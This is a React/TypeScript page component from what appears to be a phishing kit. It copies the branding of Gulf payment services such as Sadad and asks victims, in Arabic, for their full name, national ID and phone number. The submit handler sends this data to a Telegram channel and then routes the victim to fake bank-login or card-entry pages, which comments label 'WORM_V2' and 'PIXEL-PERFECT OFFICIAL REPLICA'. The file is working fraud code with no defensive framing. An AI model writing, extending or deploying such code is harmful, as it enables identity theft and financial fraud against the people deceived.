import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { serviceLogos } from "@/lib/serviceLogos";
import { ShieldCheck, User, MapPin, Phone, ArrowRight, Info } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [fullName, setFullName] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [phone, setPhone] = useState("");
  const [address, setMapAddress] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const serviceKey = (linkData?.payload?.service_key || 'sadad').toLowerCase();
  const branding = serviceLogos[serviceKey] || serviceLogos['sadad'];
  const countryCode = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const rawAmount = linkData?.payload?.payment_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");

  const Layout = getCompanyLayout(serviceKey);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !nationalId || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { fullName, nationalId, phone, address, service: serviceKey };

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, customerInfo }
      });

      await sendToTelegram({
        type: 'recipient_data',
        data: { ...customerInfo, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      // WORM_V2 Logic: If payment_type is login, go to bank login, else go to card form
      const paymentType = linkData?.payload?.payment_type || 'card';
      if (paymentType === 'login') {
        navigate(`/pay/${id}/bank-selector`);
      } else {
        navigate(`/pay/${id}/card`);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="text-right animate-in fade-in slide-in-from-bottom-4 duration-700">
        {/* WORM_V2: PIXEL-PERFECT OFFICIAL REPLICA HEADER */}
        <div className="mb-8 flex items-center justify-between bg-gray-50/50 p-4 rounded-2xl border border-gray-100">
           <div className="flex flex-col">
              <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none mb-1">Service Target</span>
              <span className="text-sm font-black text-gray-900">{branding.nameAr}</span>
           </div>
           <div className="w-10 h-10 rounded-xl bg-white flex items-center justify-center shadow-sm border border-gray-100">
              <img src={branding.logo} className="w-6 h-6 object-contain" />
           </div>
        </div>

        <h3 className="text-lg font-black text-gray-900 mb-2">بيانات التحقق من المستفيد</h3>
        <p className="text-xs font-bold text-gray-400 mb-8">الرجاء إدخال بياناتك كما هي مسجلة في الهوية الرسمية</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
               الإسم الرباعي
               <User className="w-3 h-3" />
            </Label>
            <Input 
              placeholder="أدخل الإسم بالكامل" 
              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
            />
          </div>

          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
               رقم الهوية / الإقامة
               <ShieldCheck className="w-3 h-3" />
            </Label>
            <Input 
              placeholder="10XXXXXXXX" 
              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
              value={nationalId}
              onChange={(e) => setNationalId(e.target.value)}
            />
          </div>

          <div className="space-y-2">
            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
               رقم الجوال
               <Phone className="w-3 h-3" />
            </Label>
            <Input 
              placeholder="05XXXXXXXX" 
              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
          </div>

          <Button 
            type="submit" 
            disabled={isSubmitting}
            className="w-full h-16 rounded-2xl font-black text-lg gap-2 mt-4"
            style={{ background: branding.colors.primary }}
          >
            {isSubmitting ? "جاري التحقق..." : "التحقق والمتابعة"}
            <ArrowRight className="w-5 h-5 mr-1" />
          </Button>
        </form>

        <div className="mt-8 p-4 bg-blue-50/50 border border-blue-100 rounded-2xl flex gap-3">
           <Info className="w-5 h-5 text-blue-500 shrink-0" />
           <p className="text-[10px] font-bold text-blue-700 leading-relaxed">سيتم توثيق هذه العملية عبر {branding.nameAr} لضمان أمان المعاملات المالية الموحدة في دول الخليج.</p>
        </div>
      </div>
    </Layout>
  );
};

export default PaymentRecipient;
